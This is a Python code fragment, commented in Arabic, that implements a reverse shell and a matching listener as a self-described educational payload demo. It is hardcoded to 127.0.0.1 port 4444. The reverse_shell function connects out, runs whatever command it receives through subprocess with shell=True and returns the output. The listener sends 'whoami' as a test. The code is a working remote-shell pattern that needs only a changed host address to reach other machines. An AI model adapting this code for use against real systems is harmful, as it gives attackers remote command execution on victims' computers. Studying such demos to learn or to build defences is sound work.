HOST = "127.0.0.1"  # HARDCODED - DO NOT CHANGE

def listener(port):
    """Listener: يستقبل الاتصال من الـ reverse shell"""
    print(f"\n[PAYLOAD] Listener started on {HOST}:{port}")
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((HOST, port))
    srv.listen(1)
    srv.settimeout(10)
    try:
        conn, addr = srv.accept()
        print(f"  [+] Connection from {addr}")
        # أرسل أمر تجريبي واحد للـ demo
        conn.send(b"whoami\n")
        output = conn.recv(1024).decode(errors="ignore")
        print(f"  [OUT] {output.strip()}")
        conn.close()
    except socket.timeout:
        print("  [!] Listener timed out")
    srv.close()

def reverse_shell(port):
    """Reverse Shell: يتصل بالـ listener وينفذ الأوامر"""
    time.sleep(1)  # انتظر حتى الـ listener يبدأ
    try:
        s = socket.socket()
        s.connect((HOST, port))
        print(f"  [PAYLOAD] Shell connected to {HOST}:{port}")
        cmd = s.recv(1024).decode(errors="ignore").strip()
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        s.send((result.stdout + result.stderr).encode())
        s.close()
    except Exception as e:
        print(f"  [!] Shell error: {e}")

def run_payload_demo(port=4444):
    """يشغل الـ listener والـ shell مع بعض على localhost"""
    print("\n[*] Educational Payload Demo (localhost only)")
    print("[*] ⚠  SANDBOXED - 127.0.0.1 ONLY")
    t1 = threading.Thread(target=listener, args=(port,), daemon=True)
    t2 = threading.Thread(target=reverse_shell, args=(port,))
    t1.start()
    t2.start()
    t2.join()
    print("[*] Payload demo done.")

